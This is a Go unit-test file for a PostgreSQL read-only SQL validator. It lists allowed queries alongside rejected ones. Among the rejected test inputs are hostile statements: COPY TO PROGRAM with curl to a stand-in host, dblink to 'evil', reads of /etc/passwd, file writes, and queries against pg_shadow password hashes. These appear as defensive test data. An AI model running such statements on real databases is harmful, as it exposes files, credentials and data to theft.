package security

import (
	"errors"
	"testing"
)

func TestValidateReadOnlySQL(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		sql     string
		wantErr error
	}{
		// --- valid read-only queries -------------------------------------
		{
			name: "simple select",
			sql:  "SELECT id, name FROM users WHERE active = true LIMIT 10;",
		},
		{
			name: "select with join",
			sql:  "SELECT o.id, c.email FROM orders o JOIN customers c ON c.id = o.customer_id;",
		},
		{
			name: "read-only CTE",
			sql:  "WITH active_users AS (SELECT id FROM users WHERE active) SELECT * FROM orders JOIN active_users ON orders.user_id = active_users.id;",
		},
		{
			name: "recursive CTE",
			sql:  "WITH RECURSIVE t(n) AS (VALUES (1) UNION ALL SELECT n + 1 FROM t WHERE n < 10) SELECT * FROM t;",
		},
		{
			name: "union",
			sql:  "SELECT id FROM users UNION SELECT id FROM admins;",
		},
		{
			name: "parenthesised union",
			sql:  "(SELECT 1) UNION (SELECT 2);",
		},
		{
			name: "values list",
			sql:  "VALUES (1, 'a'), (2, 'b');",
		},
		{
			name: "generate_series",
			sql:  "SELECT * FROM generate_series(1, 10) AS g(n);",
		},
		{
			name: "semicolon inside a string literal",
			sql:  "SELECT '; DROP TABLE users;' AS harmless;",
		},
		{
			name: "dollar quoted string",
			sql:  "SELECT $$hello; DROP TABLE users$$ AS harmless;",
		},
		{
			name: "line comment",
			sql:  "SELECT 1 -- ; DROP TABLE users\n;",
		},
		{
			name: "block comment",
			sql:  "SELECT /* ; DROP TABLE users */ 1;",
		},
		{
			name: "window function",
			sql:  "SELECT id, row_number() OVER (PARTITION BY customer_id ORDER BY created_at DESC) FROM orders;",
		},
		{
			name: "system catalog read",
			sql:  "SELECT relname, n_live_tup FROM pg_stat_user_tables;",
		},
		{
			name: "table sample",
			sql:  "SELECT * FROM orders TABLESAMPLE SYSTEM (10);",
		},
		{
			name: "lateral join",
			sql:  "SELECT c.id, o.total FROM customers c LEFT JOIN LATERAL (SELECT total FROM orders WHERE customer_id = c.id LIMIT 1) o ON true;",
		},

		// --- rejected: mutations and DDL ---------------------------------
		{
			name:    "delete",
			sql:     "DELETE FROM users WHERE id = 1;",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "update",
			sql:     "UPDATE users SET admin = true;",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "insert",
			sql:     "INSERT INTO users (email) VALUES ('x@y.co');",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "merge",
			sql:     "MERGE INTO users u USING admins a ON u.id = a.id WHEN MATCHED THEN DELETE;",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "drop table",
			sql:     "DROP TABLE users;",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "truncate",
			sql:     "TRUNCATE users;",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "create table",
			sql:     "CREATE TABLE evil (id int);",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "copy to program",
			sql:     "COPY users TO PROGRAM 'curl evil.sh';",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "call procedure",
			sql:     "CALL do_something();",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "set search_path",
			sql:     "SET search_path = evil;",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "explain is added by the server, not the client",
			sql:     "EXPLAIN SELECT 1;",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "multiple statements",
			sql:     "SELECT * FROM users; DROP TABLE users;",
			wantErr: ErrMultipleStatements,
		},
		{
			name:    "multiple selects",
			sql:     "SELECT 1; SELECT 2;",
			wantErr: ErrMultipleStatements,
		},

		// --- rejected: hidden mutations ----------------------------------
		{
			name:    "data modifying CTE with delete",
			sql:     "WITH deleted AS (DELETE FROM users WHERE id = 5 RETURNING *) SELECT * FROM deleted;",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "data modifying CTE with update",
			sql:     "WITH changed AS (UPDATE users SET admin = true RETURNING *) SELECT count(*) FROM changed;",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "data modifying CTE with insert",
			sql:     "WITH added AS (INSERT INTO users (email) VALUES ('x') RETURNING id) SELECT * FROM added;",
			wantErr: ErrNotReadOnly,
		},
		{
			name:    "select into",
			sql:     "SELECT * INTO temp_users FROM users;",
			wantErr: ErrSelectInto,
		},
		{
			name:    "for update",
			sql:     "SELECT * FROM accounts WHERE id = 1 FOR UPDATE;",
			wantErr: ErrLockingClause,
		},
		{
			name:    "for share nowait",
			sql:     "SELECT * FROM accounts WHERE id = 1 FOR SHARE NOWAIT;",
			wantErr: ErrLockingClause,
		},
		{
			name:    "for key share",
			sql:     "SELECT * FROM accounts WHERE id = 1 FOR KEY SHARE;",
			wantErr: ErrLockingClause,
		},

		// --- rejected: dangerous functions -------------------------------
		{
			name:    "pg_terminate_backend",
			sql:     "SELECT pg_terminate_backend(12345);",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "schema qualified pg_sleep",
			sql:     "SELECT pg_catalog.pg_sleep(10);",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "blocked function nested in a CTE",
			sql:     "WITH s AS (SELECT pg_sleep(10)) SELECT * FROM s;",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "blocked function nested in a subquery",
			sql:     "SELECT * FROM users WHERE id = (SELECT 1 FROM generate_series(1, 1) WHERE pg_sleep(10) IS NULL);",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "nextval mutates a sequence",
			sql:     "SELECT nextval('users_id_seq');",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "set_config mutates the session",
			sql:     "SELECT set_config('search_path', 'evil', false);",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "dblink exfiltrates data",
			sql:     "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int);",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "query_to_xml executes dynamic SQL",
			sql:     "SELECT query_to_xml('SELECT * FROM pg_authid', true, false, '');",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "pg_read_file reads the filesystem",
			sql:     "SELECT pg_read_file('/etc/passwd');",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "large object import",
			sql:     "SELECT lo_import('/etc/passwd');",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "directory listing",
			sql:     "SELECT pg_ls_dir('/');",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "adminpack file write",
			sql:     "SELECT pg_file_write('/tmp/evil', 'x', false);",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "statistics reset",
			sql:     "SELECT pg_stat_reset_shared('bgwriter');",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "replication slot creation",
			sql:     "SELECT pg_create_physical_replication_slot('evil');",
			wantErr: ErrBlockedFunction,
		},
		{
			name:    "logical decoding consumption",
			sql:     "SELECT pg_logical_slot_get_changes('slot', NULL, NULL);",
			wantErr: ErrBlockedFunction,
		},

		// --- rejected: sensitive catalogs --------------------------------
		{
			name:    "pg_authid",
			sql:     "SELECT * FROM pg_authid;",
			wantErr: ErrBlockedRelation,
		},
		{
			name:    "schema qualified pg_shadow",
			sql:     "SELECT usename, passwd FROM pg_catalog.pg_shadow;",
			wantErr: ErrBlockedRelation,
		},

		// --- rejected: invalid input -------------------------------------
		{
			name:    "empty",
			sql:     "   ",
			wantErr: ErrEmptyQuery,
		},
		{
			name:    "syntax error",
			sql:     "SELEC * FROM users;",
			wantErr: ErrSyntax,
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			err := ValidateReadOnlySQL(tt.sql)
			if tt.wantErr == nil {
				if err != nil {
					t.Fatalf("expected query to be accepted, got error: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("expected error %v, got nil", tt.wantErr)
			}
			if !errors.Is(err, tt.wantErr) {
				t.Fatalf("expected error %v, got %v", tt.wantErr, err)
			}
		})
	}
}

func TestValidateReadOnlySQLRejectsLeadingWhitespaceOnly(t *testing.T) {
	t.Parallel()

	if err := ValidateReadOnlySQL("\n\t  \n"); !errors.Is(err, ErrEmptyQuery) {
		t.Fatalf("expected ErrEmptyQuery, got %v", err)
	}
}

func TestFuncCallName(t *testing.T) {
	t.Parallel()

	if got := funcCallName(nil); got != "" {
		t.Fatalf("expected empty name for nil FuncCall, got %q", got)
	}
}
